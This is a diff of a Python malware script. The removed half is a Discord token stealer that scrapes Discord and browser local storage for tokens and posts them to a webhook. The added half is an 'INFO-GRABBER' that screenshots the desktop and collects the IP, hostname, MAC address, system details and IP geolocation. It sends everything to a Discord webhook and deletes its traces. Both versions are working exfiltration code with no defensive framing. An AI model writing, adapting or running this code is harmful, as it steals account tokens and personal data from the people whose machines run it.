@@ -1,74 +1,119 @@
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import socket
+import requests
+import platform
+import uuid
 import os
-import re
+import sys
 import json
+from PIL import ImageGrab
+your_webhook_url = ''
+your_webhook_nickname = ''
+sending_method = 'file'# 
+screenshot = ImageGrab.grab()
+screenshot.save('97ufg98jeaef4.png')
+ip = requests.get('https://checkip.amazonaws.com').text.strip()
+hostname = socket.gethostname()
+if sys.platform.startswith('win'):
+    user_system = 'windows'
+elif sys.platform.startswith('linux'):
+    user_system = 'Linux'
+else:
+    user_system = 'other'
+mac_int = uuid.getnode()
+mac_str = ':'.join(['{:02x}'.format((mac_int >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+if sending_method == 'file':
+    f = open("z3k1wm6pf37wash4.txt", "w")
+    f.write('IP address: ')
+    f.write(ip)
+    f.write('\n')
+    f.write('HOSTNAME: ')
+    f.write(hostname)
+    f.write('\n')
+    f.write('MAC ADDRESS: ')
+    f.write(mac_str)
+    f.write('\n')
+    f.write('OPERATING SYSTEM: ')
+    f.write(user_system)
+    f.write('\n')
+    f.write('OPERATING SYSTEM VERSION: ')
+    f.write(platform.release())
+    f.write('\n')
+    f.write('CPU ARCHITECTURE: ')
+    f.write(platform.machine())
+content = '@everyone'
+webhook = DiscordWebhook(url=your_webhook_url, username="INFO-GRABBER", content=content)
+if sending_method == 'file':
+    with open("z3k1wm6pf37wash4.txt", "rb") as f:
+        webhook.add_file(file=f.read(), filename='z3k1wm6pf37wash4.txt')
+if sending_method == 'embed':
 
-from urllib.request import Request, urlopen
+    embed = DiscordEmbed(title='GRABBING STARTED', color=242424)
+    webhook.add_embed(embed)
 
-# your webhook URL
-WEBHOOK_URL = 'WEBHOOK'
+    embed = DiscordEmbed(title='', color=242424)
+    embed.add_embed_field(name='IP address:', value=ip)
+    webhook.add_embed(embed)
 
-# mentions you when you get a hit
-PING_ME = False
+    embed = DiscordEmbed(title='', color=242424)
+    embed.add_embed_field(name='HOSTNAME: ', value=hostname)
+    webhook.add_embed(embed)
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+    embed = DiscordEmbed(title='', color=242424)
+    embed.add_embed_field(name='MAC ADDRESS: ', value=mac_str)
+    webhook.add_embed(embed)
 
-    tokens = []
+    embed = DiscordEmbed(title='', color=242424)
+    embed.add_embed_field(name='OPERATING SYSTEM: ', value=user_system)
+    webhook.add_embed(embed)
 
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
+    embed = DiscordEmbed(title='', color=242424)
+    embed.add_embed_field(name='OPERATING SYSTEM VERSION: ', value=platform.release())
+    webhook.add_embed(embed)
 
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
+    embed = DiscordEmbed(title='', color=242424)
+    embed.add_embed_field(name='CPU ARCHITECTURE: ', value=platform.machine())
+    webhook.add_embed(embed)
 
-def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+    embed = DiscordEmbed(title='GRABBING ENDED', color=242424)
+    webhook.add_embed(embed)
+if sending_method == 'file':
+    with open('97ufg98jeaef4.png', 'rb') as imagine:
+        webhook.add_file(file=imagine.read(), filename='97ufg98jeaef4.png')
+    os.remove("97ufg98jeaef4.png")
 
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+if sending_method == 'embed':
+    with open('97ufg98jeaef4.png', 'rb') as imagine:
+        webhook.add_file(file=imagine.read(), filename='97ufg98jeaef4.png')
+    os.remove("97ufg98jeaef4.png")
+if sending_method == 'file':
+    os.remove("z3k1wm6pf37wash4.txt")
+def get_ext_ip():
+    response = requests.get('https://api64.ipify.org?format=json').json()
+    return response["ip"]
+get_ext_ip()
+def get_ext_info():
+    ip_address = get_ext_ip()
+    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
+    ext_info_grabbed = {
+        "ip": ip_address,
+        "city": response.get("city"),
+        "region": response.get("region"),
+        "country": response.get("country_name"),
+        "latitude": response.get("latitude"),
+        "longitude": response.get("longitude"),
+        "timezone": response.get("timezone"),
+        "country_calling_code": response.get("country_calling_code"),
+        "currency": response.get("currency"),
+        "currency_name": response.get("currency_name"),
+        "ISP": response.get("org")
     }
-
-    message = '@everyone' if PING_ME else ''
-
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-
-        message += f'\n**{platform}**\n```\n'
-
-        tokens = find_tokens(path)
-
-        if len(tokens) > 0:
-            for token in tokens:
-                message += f'{token}\n'
-        else:
-            message += 'No tokens found.\n'
-
-        message += '```'
-
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
-
-    payload = json.dumps({'content': message})
-
-    try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
-    except:
-        pass
-
-if __name__ == '__main__':
-    main()
+    return ext_info_grabbed
+get_ext_info()
+ext_info_grabbed = get_ext_info()
+with open('extendedinfotakethel.json', 'w') as owo:
+    json.dump(ext_info_grabbed, owo)
+with open("extendedinfotakethel.json", "rb") as uwu:
+    webhook.add_file(file=uwu.read(), filename='extendedinfotakethel.json')
+response = webhook.execute()
+os.remove("extendedinfotakethel.json")
